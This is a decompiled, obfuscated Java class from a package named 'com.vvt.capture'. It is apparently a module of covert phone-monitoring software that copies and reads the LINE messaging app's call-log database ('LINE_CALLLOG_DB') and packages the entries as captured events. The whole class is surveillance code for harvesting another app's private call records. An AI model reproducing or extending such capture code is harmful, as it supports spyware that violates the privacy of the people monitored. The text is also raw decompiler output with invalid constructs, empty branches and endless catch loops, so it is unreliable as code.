package com.vvt.capture.c.b.a.a.b;

import com.vvt.ak.a;
import com.vvt.base.capture.FxSimpleEventReference;
import com.vvt.base.capture.f;
import com.vvt.base.capture.g;
import com.vvt.capture.c.m;
import com.vvt.h.d;
import java.util.ArrayList;
import java.util.Collection;
import java.util.List;

public class b
  implements f
{
  private static final boolean a = a.a;
  private static final boolean b = a.e;
  private String c;
  private d d;
  private String e;
  
  public b(String paramString1, d paramd, String paramString2)
  {
    this.c = paramString1;
    this.d = paramd;
    this.e = paramString2;
  }
  
  public g a()
  {
    boolean bool1 = a;
    if (bool1) {}
    long l = -1;
    try
    {
      localObject = m.a();
      if (localObject != null)
      {
        String str1 = this.c;
        String str2 = "LINE_CALLLOG_DB";
        String str3 = this.e;
        localObject = m.a((String)localObject, str1, str2, str3);
        boolean bool2 = com.vvt.ag.b.a((String)localObject);
        if (!bool2) {
          l = com.vvt.capture.c.b.a.b.a((String)localObject);
        }
        localObject = this.c;
        str1 = "LINE_CALLLOG_DB";
        m.a((String)localObject, str1);
      }
    }
    catch (Exception localException)
    {
      for (;;)
      {
        Object localObject;
        Long localLong;
        boolean bool3 = b;
        if (!bool3) {}
      }
    }
    localObject = new com/vvt/base/capture/FxSimpleEventReference;
    ((FxSimpleEventReference)localObject).<init>();
    localLong = Long.valueOf(l);
    ((FxSimpleEventReference)localObject).setReference(localLong);
    bool1 = a;
    if (bool1) {}
    return (g)localObject;
  }
  
  public List a(int paramInt)
  {
    bool1 = a;
    if (bool1) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    try
    {
      Object localObject = m.a();
      if (localObject != null)
      {
        int i = ((String)localObject).length();
        if (i > 0)
        {
          String str1 = this.c;
          String str2 = "LINE_CALLLOG_DB";
          String str3 = this.e;
          localObject = m.a((String)localObject, str1, str2, str3);
          long l1 = com.vvt.capture.c.b.a.b.a((String)localObject);
          long l2 = com.vvt.capture.c.b.a.b.a((String)localObject, paramInt);
          long l3 = 1L;
          l2 -= l3;
          boolean bool2 = a;
          if (bool2) {}
          d locald = this.d;
          localObject = com.vvt.capture.c.b.a.b.a((String)localObject, l2, l1, locald);
          localArrayList.addAll((Collection)localObject);
          bool1 = a;
          if (bool1) {}
          localObject = this.c;
          str1 = "LINE_CALLLOG_DB";
          m.a((String)localObject, str1);
        }
      }
    }
    catch (Exception localException)
    {
      for (;;)
      {
        bool1 = b;
        if (!bool1) {}
      }
    }
    bool1 = a;
    if (bool1) {}
    return localArrayList;
  }
  
  public List a(g paramg1, g paramg2)
  {
    bool1 = a;
    if (bool1) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    bool1 = paramg1 instanceof FxSimpleEventReference;
    if (bool1)
    {
      bool1 = paramg2 instanceof FxSimpleEventReference;
      if (!bool1) {}
    }
    try
    {
      Object localObject1 = ((g)paramg1).getReference();
      localObject1 = (Long)localObject1;
      long l1 = ((Long)localObject1).longValue();
      localObject1 = ((g)paramg2).getReference();
      localObject1 = (Long)localObject1;
      long l2 = ((Long)localObject1).longValue();
      localObject1 = m.a();
      if (localObject1 != null)
      {
        int i = ((String)localObject1).length();
        if (i > 0)
        {
          Object localObject2 = this.c;
          String str1 = "LINE_CALLLOG_DB";
          String str2 = this.e;
          localObject1 = m.a((String)localObject1, (String)localObject2, str1, str2);
          boolean bool2 = a;
          if (bool2) {}
          localObject2 = this.d;
          localObject1 = com.vvt.capture.c.b.a.b.a((String)localObject1, l1, l2, (d)localObject2);
          localArrayList.addAll((Collection)localObject1);
          bool1 = a;
          if (bool1) {}
          localObject1 = this.c;
          String str3 = "LINE_CALLLOG_DB";
          m.a((String)localObject1, str3);
        }
      }
    }
    catch (Exception localException)
    {
      for (;;)
      {
        bool1 = b;
        if (!bool1) {}
      }
    }
    bool1 = a;
    if (bool1) {}
    return localArrayList;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/MyUncaughtExceptionHandler/removeFromPath/a/a/removeFromPath/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */